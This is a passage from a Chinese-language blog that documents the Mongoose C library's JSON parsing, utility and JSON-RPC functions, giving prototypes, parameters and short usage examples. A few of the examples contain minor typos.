<li><code>json</code>  –  保存有效JSON字符串</li>
<li><code>path</code>  –  一个JSON路径。必须以<code>$</code>开始</li>
<li><code>v</code>     –  一个对应于值的占位符</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功，返回true</li>
<li>失败，返回false</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool b = false;</span><br><span class="line">mg_json_get_bool(mg_str(&quot;[123]&quot;, &quot;$[0]&quot;, &amp;b));   // Error. b remains to be false</span><br><span class="line">mg_json_get_bool(mg_str(&quot;[true]&quot;, &quot;$[0]&quot;, &amp;b));  // b is true</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-json-get-long"><a href="#mg-json-get-long" class="headerlink" title="mg_json_get_long()"></a><code>mg_json_get_long()</code></h4><ul>
<li><code>long mg_json_get_long(struct mg_str json, const char *path, long default_val);</code></li>
<li>在JSON路径<code>path</code>，从<code>json</code>字符串获取数字值(long)。</li>
<li>参数：<ul>
<li><code>json</code>  –  保存有效JSON字符串</li>
<li><code>path</code>  –  一个JSON路径。必须以<code>$</code>开始</li>
<li><code>v</code>     –  一个对应于值的占位符</li>
</ul>
</li>
<li>返回值：<ul>
<li>返回找到的值</li>
<li>返回<code>default_val</code>值</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">long a = mg_json_get_long(mg_str(&quot;[123]&quot;, &quot;$a&quot;, -1));   // a = -1</span><br><span class="line">long b = mg_json_get_long(mg_str(&quot;[123]&quot;, &quot;$[0]&quot;, -1)); // b = 123</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-json-get-str"><a href="#mg-json-get-str" class="headerlink" title="mg_json_get_str()"></a><code>mg_json_get_str()</code></h4><ul>
<li><code>char *mg_json_get_str(struct mg_str json, const char *path);</code></li>
<li>在JSON路径<code>path</code>，从<code>json</code>字符串获取字符串值。如果找到，使用<code>calloc()</code>分配内存的字符串，没有转义的返回给调用者。调用者需要手动使用<code>free()</code>释放返回的字符串</li>
<li>参数：<ul>
<li><code>json</code>  –  保存有效JSON字符串</li>
<li><code>path</code>  –  一个JSON路径。必须以<code>$</code>开始</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功，返回non-NULL</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str json = mg_str(&quot;&#123;\&quot;a\&quot;: \&quot;hi\&quot;&#125;&quot;);  // json = &#123;&quot;a&quot;: &quot;hi&quot;&#125;</span><br><span class="line">char *str = mg_json_get_str(json, &quot;$.a&quot;);        // str = &quot;hi&quot;</span><br><span class="line">free(str);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-json-get-hex"><a href="#mg-json-get-hex" class="headerlink" title="mg_json_get_hex()"></a><code>mg_json_get_hex()</code></h4><ul>
<li><code>char *mg_json_get_hex(struct mg_str json, const char *path, int *len);</code></li>
<li>在JSON路径<code>path</code>，从<code>json</code>字符串获取十六进制编码的缓冲区。如果找到，使用<code>calloc()</code>分配内存的缓冲区，解码，并且返回给调用者。调用者需要手动调用<code>free()</code>释放返回的字符串。返回的缓冲区是 0-terminated</li>
<li>参数：<ul>
<li><code>json</code>  –  保存有效JSON字符串</li>
<li><code>path</code>  –  一个JSON路径。必须以<code>$</code>开始</li>
<li><code>len</code>   –  一个指向接收解码长度的指针。可以为NULL</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功，返回non-NULL</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str json = mg_str(&quot;&#123;\&quot;a\&quot;: \&quot;6869\&quot;&#125;&quot;); // json = &#123;&quot;a&quot;: &quot;6869&quot;&#125;</span><br><span class="line">char *str = mg_json_get_hex(json, &quot;$.a&quot;, NULL);   // str = &quot;hi&quot;</span><br><span class="line">free(str);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-json-get-b64"><a href="#mg-json-get-b64" class="headerlink" title="mg_json_get_b64()"></a><code>mg_json_get_b64()</code></h4><ul>
<li><code>char *mg_json_get_b4(struct mg_str json, const char *path, int *len);</code></li>
<li>在JSON路径<code>path</code>，从<code>json</code>字符串获取base64 编码的缓冲区。如果找到，使用<code>calloc()</code>申请内存的缓冲区，解码，并返回给调用者。调用者需要手动调用<code>free()</code>释放返回的字符串。返回的缓冲区是 0-terminated</li>
<li>参数：<ul>
<li><code>json</code>  –  保存有效JSON字符串</li>
<li><code>path</code>  –  一个JSON路径。必须以<code>$</code>开始</li>
<li><code>len</code>   –  一个指向接收解码长度的指针。可以为NULL</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功，返回non-NULL</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str json = mg_str(&quot;&#123;\&quot;a\&quot;: \&quot;YWJj\&quot;&#125;&quot;); // json = &#123;&quot;a&quot;: &quot;YWJj&quot;&#125;</span><br><span class="line">char *str = mg_json_get_b64(json, &quot;$.a&quot;, NULL);   // str = &quot;abc&quot;</span><br><span class="line">free(str);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-9-Utility-API"><a href="#1-9-Utility-API" class="headerlink" title="1.9 Utility API"></a>1.9 Utility API</h3><h3 id="2-0-URL-API"><a href="#2-0-URL-API" class="headerlink" title="2.0 URL API"></a>2.0 URL API</h3><h3 id="2-1-Logging-API"><a href="#2-1-Logging-API" class="headerlink" title="2.1 Logging API"></a>2.1 Logging API</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_utility/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_utility/" class="post-title-link" itemprop="url">mongoose_utility</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose 工具</li>
</ul>
<h2 id="mg-call"><a href="#mg-call" class="headerlink" title="mg_call"></a>mg_call</h2><ul>
<li><p>简介：</p>
<ul>
<li>发送ev事件到c事件处理程序。该函数在实现您自己的协议时非常有用。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_call</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c – 发送事件的连接</li>
<li>ev – 发送的事件</li>
<li>ev_data – 附加事件参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In a timer callback, send MG_EV_USER event to all connections</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">timer_fn</span><span class="params">(<span class="type">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_mgr</span> *mgr = (<span class="keyword">struct</span> mg_mgr *) arg;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">struct</span> mg_connection *c = mgr-&gt;conns; c != <span class="literal">NULL</span>; c = c-&gt;next) &#123;</span><br><span class="line">    <span class="built_in">mg_call</span>(c, MG_EV_USER, <span class="string">&quot;hi!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-error"><a href="#mg-error" class="headerlink" title="mg_error"></a>mg_error</h2><ul>
<li><p>简介：</p>
<ul>
<li>向连接事件处理程序发送MG_EV_ERROR，并使用printf语义格式化错误信息。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_error</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c – 发送事件的连接</li>
<li>fmt – 使用printf语义格式化的字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_error</span>(c, <span class="string">&quot;Operation failed, error code: %d&quot;</span>, errno);</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_rpc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_rpc/" class="post-title-link" itemprop="url">mongoose_rpc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>RPC(Remote Procedure Call, 远程过程调用),是一种通信协议和编程模型，用于实现分布式系统中不同节点之间的远程调用。它允许在不同计算机或进程之间像调用本地函数一样调用远程函数，隐藏了底层网络通信的细节</li>
<li>Mongoose包含一组函数，通过RPC方法简化服务器端处理。</li>
</ul>
<h2 id="struct-mg-rpc"><a href="#struct-mg-rpc" class="headerlink" title="struct mg_rpc"></a>struct mg_rpc</h2><ul>
<li><p>简介：</p>
<ul>
<li>RPC方法处理程序结构。每个方法在一个链表中都有一个入口，每个入口指向一个字符串，该字符串描述了将调用该方法的模式，以及为满足该方法调用而调用的函数，并带有一个适当的函数参数。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *next;              <span class="comment">// Next in list</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> method;             <span class="comment">// Method pattern</span></span><br><span class="line">  <span class="built_in">void</span> (*fn)(<span class="keyword">struct</span> mg_rpc_req *);  <span class="comment">// Handler function</span></span><br><span class="line">  <span class="type">void</span> *fn_data;                    <span class="comment">// Handler function argument</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="struct-mg-rpc-req"><a href="#struct-mg-rpc-req" class="headerlink" title="struct mg_rpc_req"></a>struct mg_rpc_req</h2><ul>
<li><p>简介：</p>
<ul>
<li>RPC请求描述符。被调用的方法会收到一个包含请求的描述符，以及一个指向函数的指针，该函数将被调用来打印输出响应，并带有一个适当的函数参数；例如：mg_pfn_realloc() 或 mg_pfn_iobuf()</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc_req</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_rpc</span> **head;  <span class="comment">// RPC handlers list head</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *rpc;    <span class="comment">// RPC handler being called</span></span><br><span class="line">  <span class="type">mg_pfn_t</span> pfn;          <span class="comment">// Response printing function</span></span><br><span class="line">  <span class="type">void</span> *pfn_data;        <span class="comment">// Response printing function data</span></span><br><span class="line">  <span class="type">void</span> *req_data;        <span class="comment">// Arbitrary request data</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> frame;   <span class="comment">// Request, e.g. &#123;&quot;id&quot;:1,&quot;method&quot;:&quot;add&quot;,&quot;params&quot;:[1,2]&#125;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-add"><a href="#mg-rpc-add" class="headerlink" title="mg_rpc_add"></a>mg_rpc_add</h2><ul>
<li><p>简介：</p>
<ul>
<li>将方法method_pattern添加到RPC方法列表的头部。调用该方法将调用handler，并将handler_data与请求一起传递给它(如下使用示例中的r-&gt;fn_data)。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_add</span><span class="params">(<span class="keyword">struct</span> mg_rpc **head, <span class="keyword">struct</span> mg_str method_pattern,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">void</span> (*handler)(<span class="keyword">struct</span> mg_rpc_req *), <span class="type">void</span> *handler_data)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>head – 链表指针</li>
<li>method_pattern – 方法的名称</li>
<li>handler – 执行该方法操作的RPC函数</li>
<li>handler_data – 任意函数数据</li>
</ul>
</li>
<li><p>注：</p>
<ul>
<li>如果method_pattern为空字符串，该处理程序将被调用来处理JSON-RPC响应。如果JSON请求是由双方发起的，那么处理响应可能是必要的。</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *s_rpc_head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_sum</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> a = <span class="number">0.0</span>, b = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[0]&quot;</span>, &amp;a);</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[1]&quot;</span>, &amp;b);</span><br><span class="line">  <span class="built_in">mg_rpc_ok</span>(r, <span class="string">&quot;%g&quot;</span>, a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_mul</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;<span class="comment">//...&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mg_rpc_add</span>(&amp;s_rpc_head, <span class="built_in">mg_str</span>(<span class="string">&quot;sum&quot;</span>), rpc_sum, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">mg_rpc_add</span>(&amp;s_rpc_head, <span class="built_in">mg_str</span>(<span class="string">&quot;mul&quot;</span>), rpc_mul, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-del"><a href="#mg-rpc-del" class="headerlink" title="mg_rpc_del"></a>mg_rpc_del</h2><ul>
<li><p>简介：</p>
<ul>
<li>从RPC方法列表中删除带有RPC函数处理程序的方法</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_del</span><span class="params">(<span class="keyword">struct</span> mg_rpc **head, <span class="type">void</span> (*handler)(<span class="keyword">struct</span> mg_rpc_req *))</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>head – 链表指针</li>
<li>handler – RPC函数处理程序的方法，使用NULL删除全部</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *s_rpc_head = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// add methods</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Time to cleanup</span></span><br><span class="line"><span class="built_in">mg_rpc_del</span>(&amp;s_rpc_head, rpc_mul);    <span class="comment">// Deallocate specific handler</span></span><br><span class="line"><span class="built_in">mg_rpc_del</span>(&amp;s_rpc_head, <span class="literal">NULL</span>);       <span class="comment">// Deallocate all RPC handlers</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-process"><a href="#mg-rpc-process" class="headerlink" title="mg_rpc_process"></a>mg_rpc_process</h2><ul>
<li><p>简介：</p>
<ul>
<li>为这个请求调用合适的方法。如果请求的方法不存在，将调用mg_rpc_err()并打印错误提示。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_process</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *req)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc</span> *s_rpcs = <span class="literal">NULL</span>;                               <span class="comment">// Empty RPC list head</span></span><br><span class="line"><span class="built_in">mg_rpc_add</span>(&amp;s_rpcs, <span class="built_in">mg_str</span>(<span class="string">&quot;rpc.list&quot;</span>), mg_rpc_list, <span class="literal">NULL</span>); <span class="comment">// Add rpc.list</span></span><br><span class="line"><span class="comment">// ... add more RPC methods</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// On request, process the incoming frame</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_str</span> req = <span class="built_in">mg_str</span>(<span class="string">&quot;&#123;\&quot;id\&quot;:1,\&quot;method\&quot;:\&quot;sum\&quot;,\&quot;params\&quot;:[1,2]&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_iobuf</span> io = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">512</span>&#125;;  <span class="comment">// Empty IO buf, with 512 realloc granularity</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_rpc_req</span> r = &#123;</span><br><span class="line">  .head = &amp;s_rpcs,        <span class="comment">// RPC list head</span></span><br><span class="line">  .rpc = <span class="literal">NULL</span>,            <span class="comment">// This will be set by mg_rpc_process()</span></span><br><span class="line">  .pfn = mg_pfn_iobuf,    <span class="comment">// Printing function: print into the io buffer</span></span><br><span class="line">  .pfn_data = &amp;io,        <span class="comment">// Pass our io buffer as a parameter</span></span><br><span class="line">  .req_data = <span class="literal">NULL</span>,       <span class="comment">// No specific request data</span></span><br><span class="line">  .frame = req,           <span class="comment">// Specify incoming frame</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mg_rpc_process</span>(&amp;r);</span><br><span class="line"><span class="keyword">if</span> (io.buf != <span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;Response: %s\n&quot;</span>, (<span class="type">char</span> *) io.buf);</span><br><span class="line"><span class="built_in">mg_iobuf_free</span>(&amp;io);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-ok-mg-rpc-vok"><a href="#mg-rpc-ok-mg-rpc-vok" class="headerlink" title="mg_rpc_ok, mg_rpc_vok"></a>mg_rpc_ok, mg_rpc_vok</h2><ul>
<li><p>简介：</p>
<ul>
<li>打印结果帧的辅助函数</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_ok</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_vok</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">const</span> <span class="type">char</span> *fmt, va_list *ap)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
<li>fmt – 使用printf语义格式化的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_sum</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> a = <span class="number">0.0</span>, b = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[0]&quot;</span>, &amp;a);</span><br><span class="line">  <span class="built_in">mg_json_get_num</span>(r-&gt;frame, <span class="string">&quot;$.params[1]&quot;</span>, &amp;b);</span><br><span class="line">  <span class="built_in">mg_rpc_ok</span>(r, <span class="string">&quot;%g&quot;</span>, a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-err-mg-rpc-verr"><a href="#mg-rpc-err-mg-rpc-verr" class="headerlink" title="mg_rpc_err, mg_rpc_verr"></a>mg_rpc_err, mg_rpc_verr</h2><ul>
<li><p>简介：</p>
<ul>
<li>打印错误帧的辅助函数</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_err</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">int</span> code, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_verr</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *, <span class="type">int</span> code, <span class="type">const</span> <span class="type">char</span> *fmt, va_list *)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
<li>fmt – 使用printf语义格式化的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rpc_dosome</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">mg_rpc_err</span>(r, <span class="number">-32109</span>, <span class="string">&quot;\&quot;%.*s not found\&quot;&quot;</span>, len, &amp;r-&gt;frame.ptr[offset]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-rpc-list"><a href="#mg-rpc-list" class="headerlink" title="mg_rpc_list"></a>mg_rpc_list</h2><ul>
<li><p>简介：</p>
<ul>
<li>内置RPC方法，用于列出所有已注册的RPC方法。该函数通常不直接调用，而是作为方法注册。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_rpc_list</span><span class="params">(<span class="keyword">struct</span> mg_rpc_req *r)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>req – 一个请求</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mg_rpc_add</span>(&amp;s_rpc_head, <span class="built_in">mg_str</span>(<span class="string">&quot;rpc.list&quot;</span>), mg_rpc_list, &amp;s_rpc_head);</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
